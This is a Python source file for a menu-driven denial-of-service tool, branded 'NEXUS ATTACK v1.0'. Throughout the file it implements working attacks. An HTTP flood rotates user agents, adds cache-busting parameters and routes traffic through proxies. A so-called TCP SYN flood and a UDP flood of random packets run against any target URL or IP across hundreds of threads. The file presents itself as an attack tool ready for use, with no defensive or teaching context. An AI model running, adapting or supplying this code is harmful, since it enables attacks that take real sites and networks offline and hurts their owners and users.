import threading
import socket
import random
import sys
import time
import requests
from urllib.parse import urlparse
import os

# --- Colors ---
C_RESET = '\033[0m'
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_CYAN = '\033[96m'
C_WHITE = '\033[97m'

# --- General Settings ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"
]
proxies = []

# --- ASCII Banner ---
banner = f"""
{C_GREEN}
 ███▄    █ ▓█████ ▒██   ██▒ █    ██   ██████ 
 ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒ 
▓██  ▀█ ██▒▒███   ░░  █   ░▓██  ▒██░░ ▓██▄   
▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒
▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒
░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░░▒░ ░ ░ ░  ░  ░
   ░   ░ ░    ░    ░    ░   ░░░ ░ ░ ░  ░  ░  
         ░    ░  ░ ░    ░     ░           ░  
{C_RESET}
"""


# --- Layer 7 Attack Functions ---
def load_proxies():
    """Loads the proxy list from proxies.txt."""
    try:
        with open('proxies.txt', 'r') as f:
            proxies.extend(f.read().strip().split('\n'))
        if not proxies:
            print(f"{C_YELLOW}[Warning] proxies.txt is empty or not found. Attack will continue without proxies.{C_RESET}")
    except IOError:
        print(f"{C_YELLOW}[Warning] proxies.txt not found. Attack will continue without proxies.{C_RESET}")

def http_flood_attack(target_url, end_time):
    """Performs an advanced HTTP Flood attack."""
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': f'https://www.google.com/search?q={random.randint(1, 1000)}',
                'Connection': 'keep-alive',
            }
            # Add a random query parameter to the URL to bypass cache
            attack_url = f"{target_url}?{random.randint(1, 100000)}={random.randint(1, 100000)}"
            
            # Use a proxy if available
            proxy = {'http': f'http://{random.choice(proxies)}', 'https': f'https://{random.choice(proxies)}'} if proxies else None
            
            requests.get(attack_url, headers=headers, timeout=5, proxies=proxy)
        except (requests.exceptions.RequestException, ConnectionError):
            pass

# --- Layer 4 Attack Functions ---
def tcp_syn_flood(target_ip, target_port, end_time):
    """Performs a TCP SYN Flood attack."""
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            # Leave the connection half-open without closing it immediately
        except socket.error:
            pass
        finally:
            s.close()

def udp_flood(target_ip, target_port, end_time):
    """Performs a UDP Flood attack."""
    packet_size = 1024 # 1 KB packets
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            packet = random._urandom(packet_size)
            udp_socket.sendto(packet, (target_ip, target_port))
        except socket.error:
            pass

# --- Main Menu and Management ---
def main_menu():
    print(banner)
    print(f"{C_CYAN}╔═════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║           NEXUS ATTACK v1.0             ║{C_RESET}")
    print(f"{C_CYAN}╠═════════════════════════════════════════╣{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}1. Layer 7 (Application) Attacks        {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}2. Layer 4 (Network) Attacks            {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╚═════════════════════════════════════════╝{C_RESET}")
    choice = input(f"{C_YELLOW}Your choice -> {C_RESET}")

    if choice == '1':
        layer7_menu()
    elif choice == '2':
        layer4_menu()
    else:
        print(f"{C_RED}Invalid choice.{C_RESET}")
        sys.exit()

def layer7_menu():
    print(f"\n{C_CYAN}╔═════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║     Layer 7 Attacks     ║{C_RESET}")
    print(f"{C_CYAN}╚═════════════════════════╝{C_RESET}")
    target_url = input(f"{C_YELLOW}Target URL (e.g., http://example.com) -> {C_RESET}")
    if not urlparse(target_url).scheme:
        print(f"\n{C_RED}Error: Please enter a valid URL.{C_RESET}")
        return
    num_threads = int(input(f"{C_YELLOW}Number of Threads (e.g., 500) -> {C_RESET}"))
    attack_duration = int(input(f"{C_YELLOW}Attack Duration (seconds) -> {C_RESET}"))
    
    load_proxies()
    
    print(f"\n{C_GREEN}[L7] Starting HTTP Flood attack...{C_RESET}")
    run_attack(http_flood_attack, (target_url, time.time() + attack_duration), num_threads, attack_duration)

def layer4_menu():
    print(f"\n{C_CYAN}╔═════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║     Layer 4 Attacks     ║{C_RESET}")
    print(f"{C_CYAN}╠═════════════════════════╣{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}1. TCP SYN Flood        {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}2. UDP Flood            {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╚═════════════════════════╝{C_RESET}")
    choice = input(f"{C_YELLOW}Attack Method -> {C_RESET}")
    
    target_ip = input(f"{C_YELLOW}Target IP Address -> {C_RESET}")
    target_port = int(input(f"{C_YELLOW}Target Port -> {C_RESET}"))
    num_threads = int(input(f"{C_YELLOW}Number of Threads (e.g., 500) -> {C_RESET}"))
    attack_duration = int(input(f"{C_YELLOW}Attack Duration (seconds) -> {C_RESET}"))
    
    end_time = time.time() + attack_duration
    if choice == '1':
        print(f"\n{C_GREEN}[L4] Starting TCP SYN Flood attack...{C_RESET}")
        run_attack(tcp_syn_flood, (target_ip, target_port, end_time), num_threads, attack_duration)
    elif choice == '2':
        print(f"\n{C_GREEN}[L4] Starting UDP Flood attack...{C_RESET}")
        run_attack(udp_flood, (target_ip, target_port, end_time), num_threads, attack_duration)
    else:
        print(f"{C_RED}Invalid choice.{C_RESET}")

def run_attack(attack_func, args, num_threads, attack_duration):
    print(f"{C_YELLOW}======================================{C_RESET}")
    print(f"{C_GREEN}Target: {C_WHITE}{args[0]}{C_RESET}")
    print(f"{C_GREEN}Threads: {C_WHITE}{num_threads}{C_RESET}")
    print(f"{C_GREEN}Duration: {C_WHITE}{attack_duration} seconds{C_RESET}")
    print(f"{C_YELLOW}======================================{C_RESET}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_func, args=args)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    time.sleep(attack_duration)
    print(f"\n{C_GREEN}Attack finished.{C_RESET}")

if __name__ == "__main__":
    os.system("") # Enable ANSI colors on Windows
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{C_RED}Attack stopped by user.{C_RESET}")
        sys.exit()
    except (ValueError, IndexError):
        print(f"\n{C_RED}Error: Please enter a valid value.{C_RESET}")
    except Exception as e:
        print(f"\n{C_RED}An unexpected error occurred: {e}{C_RESET}")
